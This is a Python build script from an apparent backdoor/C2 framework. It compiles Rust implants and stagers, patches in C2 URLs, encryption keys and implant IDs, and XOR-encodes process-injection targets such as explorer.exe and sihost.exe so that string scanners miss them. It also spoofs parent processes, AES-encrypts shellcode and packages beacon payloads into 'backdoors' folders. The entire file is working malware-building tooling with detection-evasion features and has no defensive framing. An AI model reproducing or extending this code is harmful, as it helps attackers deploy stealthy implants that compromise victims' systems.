# bab/build.py — cargo compilation, binary patching, shellcode packaging

import os
import shutil
from pathlib import Path

from .ui       import section, ok, err, info
from .config   import HERE, ROOT, BUILD_DIR, IMPLANT_OUT
from .assemble import assemble_implant, assemble_stager
from .cargo    import CARGO_ENV, CARGO_TARGET, _find_cargo, run_cmd

# ── Implant config patcher ────────────────────────────────────────────────────────
_MAGIC   = b'THORNCFG'
_KEY_LEN = 32
_IV_LEN  = 16
_URL_LEN = 256
_IMP_LEN = 64

def _patch_binary(data: bytes, key: bytes, iv: bytes, url: bytes, imp_id: bytes) -> bytes:
    idx = data.find(_MAGIC)
    if idx == -1:
        raise ValueError("THORNCFG magic not found — make sure this is the right binary")
    buf = bytearray(data)
    pos = idx + len(_MAGIC)
    buf[pos:pos + _KEY_LEN] = key.ljust(_KEY_LEN, b'\x00');    pos += _KEY_LEN
    buf[pos:pos + _IV_LEN]  = iv.ljust(_IV_LEN,  b'\x00');     pos += _IV_LEN
    buf[pos:pos + _URL_LEN] = url.ljust(_URL_LEN, b'\x00');    pos += _URL_LEN
    buf[pos:pos + _IMP_LEN] = imp_id.ljust(_IMP_LEN, b'\x00')
    return bytes(buf)

# ── Build steps ───────────────────────────────────────────────────────────────────
def compile_cargo(label: str) -> bool:
    """Compile an already-assembled crate in BUILD_DIR/<label>/."""
    section(f"Build {label}")
    build_dir = BUILD_DIR / label

    if not build_dir.exists():
        err(f"Assembled crate not found at {build_dir} — assemble step must have failed.")
        return False

    # Wipe target dir if Cargo.toml was recently regenerated (avoids stale feature cache)
    target_dir = build_dir / "target"
    if target_dir.exists():
        shutil.rmtree(target_dir, ignore_errors=True)

    info("Running cargo build --release …")
    try:
        cargo = _find_cargo()
    except FileNotFoundError as e:
        err(str(e))
        return False
    if not run_cmd(
        [cargo, "build", "--release", f"--target={CARGO_TARGET}"],
        cwd=build_dir, env=CARGO_ENV
    ):
        err(f"{label} build failed.")
        return False

    exe = build_dir / "target" / CARGO_TARGET / "release" / f"{label}.exe"
    if not exe.exists():
        err(f"Expected binary not found: {exe}")
        return False

    if label == "stager":
        dest = ROOT / "backdoors" / "stagers" / "stager_release.exe"
        dest.parent.mkdir(parents=True, exist_ok=True)
    else:
        dest = BUILD_DIR / f"{label}_release.exe"

    shutil.copy2(exe, dest)
    return True

# STR_KEY must match config.rs / main.rs in dynamic_inject stager.
_STR_KEY = 0x37

def _xor_bytes(data: bytes, key: int = _STR_KEY) -> bytes:
    return bytes(b ^ key for b in data)

def _encode_candidates(names: list) -> bytes:
    """Pack a list of process names into a null-separated, double-null terminated
    512-byte blob, then XOR-encode the whole blob with _STR_KEY so no plaintext
    process names appear in the binary's .data section."""
    blob = b""
    for name in names:
        encoded = name.encode("utf-8") + b"\x00"
        if len(blob) + len(encoded) + 1 > 512:
            break  # leave room for double-null terminator
        blob += encoded
    blob += b"\x00"  # double-null terminator
    blob = blob.ljust(512, b"\x00")[:512]
    return _xor_bytes(blob)

# Default candidate list used when stager variant is dynamic_inject and no
# inject_candidates key is present in the build config.
_DEFAULT_CANDIDATES = [
    "RuntimeBroker.exe",
    "sihost.exe",
    "ctfmon.exe",
    "dllhost.exe",
    "explorer.exe",
]

def patch_stager(cfg: dict) -> bool:
    section("Patch Stager Config")
    src = ROOT / "backdoors" / "stagers" / "stager_release.exe"
    if not src.exists():
        err("stager_release.exe not found — build stager first.")
        return False
    data  = src.read_bytes()
    # Stager variant determines magic layout. dynamic_inject and
    # thornldr_stager both use the same 9-byte binary marker (not an ASCII
    # word) so string scanners don't flag it. Other stagers still use the
    # legacy STAGERCFG ASCII marker.
    stager_variant = cfg.get("component_stager", "").strip()
    _BINARY_LAYOUT_STAGERS = {"dynamic_inject", "thornldr_stager"}
    if stager_variant in _BINARY_LAYOUT_STAGERS:
        magic = bytes([0xC1, 0x94, 0x3E, 0xA7, 0x6B, 0x0D, 0xF2, 0x58, 0x22])
    else:
        magic = b'STAGERCFG'
    idx = data.find(magic)
    if idx == -1:
        err("Stager config magic not found in stager binary.")
        return False
    key       = cfg["key"].encode().ljust(32, b'\x00')[:32]
    iv        = cfg["iv"].encode().ljust(16,  b'\x00')[:16]
    ppid_proc = cfg.get("stager_ppid_proc", "explorer.exe").encode().ljust(64, b'\x00')[:64]
    buf = bytearray(data)
    pos = idx + len(magic)
    buf[pos:pos + 32] = key; pos += 32
    buf[pos:pos + 16] = iv;  pos += 16

    # dynamic_inject / thornldr_stager struct layout:
    #   key | iv | ppid_proc(64) | candidates(512)
    # ppid_proc and candidates are XOR-encoded so no plaintext process names
    # appear in .data. All other stager variants keep the legacy plaintext layout:
    #   key | iv | inject_target(64) | ppid_proc(64)
    if stager_variant in _BINARY_LAYOUT_STAGERS:
        buf[pos:pos + 64] = _xor_bytes(ppid_proc); pos += 64
        raw_candidates = cfg.get("inject_candidates", _DEFAULT_CANDIDATES)
        candidates = _encode_candidates(raw_candidates)  # already XOR-encoded
        buf[pos:pos + 512] = candidates
    else:
        inject_target = cfg.get("stager_inject_target",
                                r"C:\Windows\System32\sihost.exe").encode().ljust(64, b'\x00')[:64]
        buf[pos:pos + 64] = inject_target; pos += 64
        buf[pos:pos + 64] = ppid_proc

    src.write_bytes(bytes(buf))
    stager_name = cfg.get("stager_filename", "").strip()
    if stager_name and stager_name != "stager_release.exe":
        dest = src.parent / stager_name
        shutil.move(str(src), str(dest))
        ok(f"backdoors/stagers/{stager_name}  ({dest.stat().st_size // 1024} KB)")
    else:
        ok(f"backdoors/stagers/stager_release.exe  ({src.stat().st_size // 1024} KB)")
    return True


def encrypt_shellcode_file(input_path: Path, output_path: Path, cfg: dict) -> bool:
    """AES-256-CBC encrypt a raw shellcode file using the build config key/IV."""
    section("Encrypt Shellcode")
    if not input_path.exists():
        err(f"Input file not found: {input_path}")
        return False
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad as pkcs7_pad
    except ImportError:
        err("pycryptodome not installed.  Run: pip install pycryptodome")
        return False
    key = cfg["key"].encode().ljust(32, b'\x00')[:32]
    iv  = cfg["iv"].encode().ljust(16,  b'\x00')[:16]
    raw = input_path.read_bytes()
    enc = AES.new(key, AES.MODE_CBC, iv).encrypt(pkcs7_pad(raw, AES.block_size))
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_bytes(enc)
    ok(f"{output_path}  ({len(raw):,} bytes → {len(enc):,} bytes encrypted)")
    return True

def patch_implant(cfg: dict) -> bool:
    section("Patch Implant Config")
    src = BUILD_DIR / "implant_release.exe"
    tmp = BUILD_DIR / "implant_patched.exe"
    if not src.exists():
        err(f"implant_release.exe not found — build implant first.\n  (expected at {src})")
        return False
    try:
        patched = _patch_binary(
            src.read_bytes(),
            cfg["key"].encode(),
            cfg["iv"].encode(),
            cfg["url"].encode(),
            cfg["imp_id"].encode(),
        )
    except ValueError as e:
        err(str(e))
        return False
    tmp.write_bytes(patched)
    IMPLANT_OUT.mkdir(parents=True, exist_ok=True)
    dest = IMPLANT_OUT / "implant_patched.exe"
    shutil.copy2(tmp, dest)
    ok(f"backdoors/implant/implant_patched.exe  ({dest.stat().st_size // 1024} KB)")
    return True

# ── Compound build helpers ────────────────────────────────────────────────────────
def build_stager(cfg: dict) -> bool:
    if not assemble_stager(cfg):
        return False
    if compile_cargo("stager"):
        return patch_stager(cfg)
    return False

def build_implant(cfg: dict) -> bool:
    if not assemble_implant(cfg):
        return False
    if compile_cargo("implant"):
        if patch_implant(cfg):
            from .loader import thornldr_implant
            pe_path = BUILD_DIR / "implant_patched.exe"
            loader_features = cfg.get("loader_features") or None
            if thornldr_implant(pe_path, features=loader_features):
                impl_name = cfg.get("implant_filename", "").strip()
                if impl_name:
                    src  = IMPLANT_OUT / "beacon.bin"
                    dest = IMPLANT_OUT / (impl_name + ".bin")
                    shutil.move(str(src), str(dest))
                    ok(f"backdoors/implant/{dest.name}  ({dest.stat().st_size // 1024} KB)")
                else:
                    blob = IMPLANT_OUT / "beacon.bin"
                    ok(f"backdoors/implant/beacon.bin  ({blob.stat().st_size // 1024} KB)")
                return True
    return False

def build_all(cfg: dict) -> bool:
    return build_stager(cfg) and build_implant(cfg)
